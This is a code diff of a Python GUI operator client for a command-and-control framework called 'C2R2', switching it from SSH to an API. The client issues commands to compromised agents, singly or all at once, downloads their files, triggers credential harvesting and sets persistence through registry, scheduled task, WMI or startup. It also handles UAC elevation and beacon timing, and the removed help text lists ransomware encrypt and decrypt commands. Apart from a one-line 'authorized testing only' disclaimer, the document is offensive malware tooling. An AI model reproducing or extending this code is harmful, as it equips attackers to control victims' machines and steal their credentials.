-    def _log_console(self, text, tag=None):
+    def _log_console(self, text: str, tag: Optional[str] = None):
         """Log text to the console output."""
         self.console_output.config(state=tk.NORMAL)
         if tag:
@@ -899,54 +1000,14 @@ class C2R2TeamClient:
         self.console_output.see(tk.END)
         self.console_output.config(state=tk.DISABLED)
     
-    def _update_agent(self, agent_info):
-        """Update or add an agent to the tree."""
-        agent_id = agent_info['id']
-        
-        # Check if agent already exists (using agent_id to item mapping for efficiency)
-        if agent_id in self._agent_tree_items:
-            item = self._agent_tree_items[agent_id]
-            if self.agents_tree.exists(item):
-                self.agents_tree.item(item, values=(
-                    agent_id,
-                    agent_info.get('hostname', agent_info.get('addr', '...')),
-                    agent_info.get('username', '...'),
-                    agent_info.get('os', '...'),
-                    agent_info.get('privileges', '...')
-                ))
-                self.agents[agent_id] = agent_info
-                return
-        
-        # Add new agent
-        item = self.agents_tree.insert('', tk.END, values=(
-            agent_id,
-            agent_info.get('hostname', agent_info.get('addr', '...')),
-            agent_info.get('username', '...'),
-            agent_info.get('os', '...'),
-            agent_info.get('privileges', '...')
-        ))
-        self._agent_tree_items[agent_id] = item
-        self.agents[agent_id] = agent_info
-    
-    @staticmethod
-    def _validate_agent_id(agent_id):
-        """Validate that agent_id contains only digits."""
-        return str(agent_id).isdigit()
-    
     def _on_agent_select(self, event):
         """Handle agent selection in treeview."""
         selection = self.agents_tree.selection()
         if selection:
             item = selection[0]
             values = self.agents_tree.item(item)['values']
-            agent_id = str(values[0])
+            agent_id = int(values[0])
             
-            # Validate agent_id before sending command
-            if not self._validate_agent_id(agent_id):
-                return
-            
-            # Select the agent
-            self._send_raw_command(f"/select {agent_id}\n")
             self.selected_client = agent_id
             self._update_prompt()
     
@@ -956,14 +1017,17 @@ class C2R2TeamClient:
         if selection:
             item = selection[0]
             values = self.agents_tree.item(item)['values']
-            agent_id = str(values[0])
-            
-            # Validate agent_id before sending command
-            if not self._validate_agent_id(agent_id):
-                return
+            agent_id = int(values[0])
             
             # Show agent info
-            self._send_raw_command(f"/info {agent_id}\n")
+            agent_info = self.agents.get(agent_id, {})
+            self._log_console(f"\n📋 Agent [{agent_id}] Info:\n", 'info')
+            self._log_console(f"   Address: {agent_info.get('addr', 'N/A')}\n")
+            self._log_console(f"   Hostname: {agent_info.get('hostname', 'N/A')}\n")
+            self._log_console(f"   Username: {agent_info.get('username', 'N/A')}\n")
+            self._log_console(f"   OS: {agent_info.get('os_version', 'N/A')}\n")
+            self._log_console(f"   Privileges: {agent_info.get('privileges', 'N/A')}\n")
+            self._log_console(f"   Connected: {agent_info.get('connected_at', 'N/A')}\n\n")
     
     def _update_prompt(self):
         """Update the command prompt."""
@@ -975,50 +1039,176 @@ class C2R2TeamClient:
     def _send_command(self, event):
         """Send command from the entry field."""
         cmd = self.cmd_entry.get().strip()
-        if cmd:
-            # Add to history
-            self.cmd_history.append(cmd)
-            self.history_index = len(self.cmd_history)
-            
-            # Clear entry
-            self.cmd_entry.delete(0, tk.END)
-            
-            # Send command
-            self._send_raw_command(cmd + '\n')
-            
-            # Handle local commands
-            if cmd.startswith('/select '):
-                try:
-                    parts = cmd.split()
-                    if len(parts) >= 2:
-                        self.selected_client = parts[1]
-                        self._update_prompt()
-                except Exception:
-                    pass
-            elif cmd == '/deselect':
-                self.selected_client = None
-                self._update_prompt()
-    
-    def _send_raw_command(self, cmd):
-        """Send raw command to SSH channel."""
-        if self.ssh.connected:
-            self.ssh.send_to_channel(cmd)
-            self._log_console(f">>> {cmd}", 'prompt')
-    
-    def _quick_command(self, cmd):
-        """Execute a quick action command."""
-        self._send_raw_command(cmd + '\n')
-    
-    def _refresh_agents(self):
-        """Refresh the agents list."""
-        # Clear current list
-        for item in self.agents_tree.get_children():
-            self.agents_tree.delete(item)
-        self.agents.clear()
-        self._agent_tree_items.clear()
+        if not cmd:
+            return
         
-        # Request new list
-        self._send_raw_command("/list\n")
+        # Add to history
+        self.cmd_history.append(cmd)
+        self.history_index = len(self.cmd_history)
+        
+        # Clear entry
+        self.cmd_entry.delete(0, tk.END)
+        
+        # Log the command
+        self._log_console(f">>> {cmd}\n", 'prompt')
+        
+        # Parse and execute command
+        parts = cmd.split()
+        if not parts:
+            return
+        
+        command = parts[0].lower()
+        
+        # Handle local commands
+        if command == '/list':
+            self._refresh_agents()
+        
+        elif command == '/select' and len(parts) >= 2:
+            try:
+                agent_id = int(parts[1])
+                if agent_id in self.agents:
+                    self.selected_client = agent_id
+                    self._update_prompt()
+                    self._log_console(f"✅ Selected agent {agent_id}\n", 'success')
+                else:
+                    self._log_console(f"❌ Agent {agent_id} not found\n", 'error')
+            except ValueError:
+                self._log_console("❌ Invalid agent ID\n", 'error')
+        
+        elif command == '/deselect':
+            self.selected_client = None
+            self._update_prompt()
+            self._log_console("✅ Deselected agent\n", 'success')
+        
+        elif command == '/help':
+            self._show_commands_help()
+        
+        elif command == '/cmd' and len(parts) >= 2:
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                cmd_text = ' '.join(parts[1:])
+                self._execute_command(self.selected_client, cmd_text)
+        
+        elif command == '/cmd_all' and len(parts) >= 2:
+            cmd_text = ' '.join(parts[1:])
+            self._execute_command_all(cmd_text)
+        
+        elif command == '/download' and len(parts) >= 2:
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                remote_path = ' '.join(parts[1:])
+                self._download_file(self.selected_client, remote_path)
+        
+        elif command == '/harvest':
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                self._harvest_credentials(self.selected_client)
+        
+        elif command == '/persist' and len(parts) >= 2:
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                method = parts[1]
+                self._set_persistence(self.selected_client, method)
+        
+        elif command == '/beacon' and len(parts) >= 2:
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                try:
+                    config = parts[1].split(':')
+                    interval = int(config[0])
+                    jitter = int(config[1]) if len(config) > 1 else 0
+                    self._configure_beacon(self.selected_client, interval, jitter)
+                except (ValueError, IndexError):
+                    self._log_console("❌ Invalid beacon config. Use /beacon <interval:jitter>\n", 'error')
+        
+        elif command == '/elevate':
+            if self.selected_client is None:
+                self._log_console("❌ No agent selected. Use /select <id>\n", 'error')
+            else:
+                self._elevate_agent(self.selected_client)
+        
+        else:
+            self._log_console(f"❌ Unknown command: {command}. Use /help\n", 'error')
+    
+    def _execute_command(self, agent_id: int, command: str):
+        """Execute a command on an agent."""
+        def execute_thread():
+            success, message = self.api.send_command(agent_id, command)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"📤 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=execute_thread, daemon=True).start()
+    
+    def _execute_command_all(self, command: str):
+        """Execute a command on all agents."""
+        def execute_thread():
+            success, results = self.api.send_command_all(command)
+            if success:
+                for result in results:
+                    tag = 'success' if result.get('success') else 'error'
+                    self.root.after(0, lambda r=result, t=tag: self._log_console(
+                        f"📤 [{r.get('agent_id')}]: {r.get('message')}\n", t
+                    ))
+            else:
+                self.root.after(0, lambda: self._log_console(f"❌ Failed: {results}\n", 'error'))
+        
+        threading.Thread(target=execute_thread, daemon=True).start()
+    
+    def _download_file(self, agent_id: int, remote_path: str):
+        """Request file download from agent."""
+        def download_thread():
+            success, message = self.api.download_file(agent_id, remote_path)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"📥 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=download_thread, daemon=True).start()
+    
+    def _harvest_credentials(self, agent_id: int):
+        """Trigger credential harvesting."""
+        def harvest_thread():
+            success, message = self.api.harvest_credentials(agent_id)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"🔑 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=harvest_thread, daemon=True).start()
+    
+    def _set_persistence(self, agent_id: int, method: str):
+        """Set persistence on agent."""
+        def persist_thread():
+            success, message = self.api.set_persistence(agent_id, method)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"📌 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=persist_thread, daemon=True).start()
+    
+    def _configure_beacon(self, agent_id: int, interval: int, jitter: int):
+        """Configure beacon timing."""
+        def beacon_thread():
+            success, message = self.api.configure_beacon(agent_id, interval, jitter)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"📡 [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=beacon_thread, daemon=True).start()
+    
+    def _elevate_agent(self, agent_id: int):
+        """Elevate agent to admin."""
+        def elevate_thread():
+            success, message = self.api.elevate_agent(agent_id)
+            tag = 'success' if success else 'error'
+            self.root.after(0, lambda: self._log_console(f"⬆️ [{agent_id}]: {message}\n", tag))
+        
+        threading.Thread(target=elevate_thread, daemon=True).start()
+    
+    def _quick_command(self, cmd: str):
+        """Execute a quick action command."""
+        self.cmd_entry.delete(0, tk.END)
+        self.cmd_entry.insert(0, cmd)
+        self._send_command(None)
     
     def _history_up(self, event):
         """Navigate command history up."""
@@ -1041,12 +1231,12 @@ class C2R2TeamClient:
         """Show about dialog."""
         messagebox.showinfo(
             "About C2R2 Team Client",
-            "C2R2 Team Client v1.0\n\n"
+            "C2R2 Team Client v2.0\n\n"
             "A graphical interface for connecting to\n"
-            "C2R2 Command & Control servers via SSH.\n\n"
-            "Similar to Havoc Team Client architecture:\n"
+            "C2R2 Command & Control servers via API.\n\n"
+            "Architecture:\n"
             "- Server runs on red team infrastructure\n"
-            "- Operators connect via SSH\n"
+            "- Operators connect via HTTP/WebSocket API\n"
             "- GUI displays connected agents\n\n"
             "⚠️ FOR AUTHORIZED SECURITY TESTING ONLY"
         )
@@ -1058,7 +1248,6 @@ class C2R2TeamClient:
    /list                  - List all connected clients
    /select <id>           - Select a client by ID
    /deselect              - Deselect current client
-   /info <id>             - Show detailed client info
 
 💻 Command Execution:
    /cmd <command>         - Execute command on selected client
@@ -1066,27 +1255,20 @@ class C2R2TeamClient:
 
 📁 File Operations:
    /download <path>       - Download file from agent
-   /upload <local> <remote> - Upload file to agent
 
 🔧 Advanced Operations:
    /harvest               - Harvest credentials
-   /elevate               - Elevate to admin (UAC)
-   /persist <method>      - Establish persistence
-   /persist_remove        - Remove persistence
-   /beacon <int:jit>      - Configure beacon timing
+   /persist <method>      - Establish persistence (registry|task|wmi|startup)
+   /beacon <int:jit>      - Configure beacon timing (e.g., 60:30)
+   /elevate               - Elevate to admin (UAC prompt)
 
-🔐 Ransomware (if module loaded):
-   /encrypt <path>        - Encrypt files
-   /decrypt <path> <key>  - Decrypt files
-
-ℹ️ Server:
-   /help                  - Show help
-   /exit, /quit           - Shutdown server
+ℹ️ Other:
+   /help                  - Show this help
 """
         # Create a new window for help
         help_window = tk.Toplevel(self.root)
         help_window.title("C2R2 Commands Help")
-        help_window.geometry("500x600")
+        help_window.geometry("500x500")
         help_window.configure(bg=self.colors['bg'])
         
         text = scrolledtext.ScrolledText(
@@ -1102,9 +1284,8 @@ class C2R2TeamClient:
     
     def _on_close(self):
         """Handle window close."""
-        self._stop_event.set()
         self.running = False
-        self.ssh.disconnect()
+        self.api.disconnect()
         self.root.destroy()
     
     def run(self):
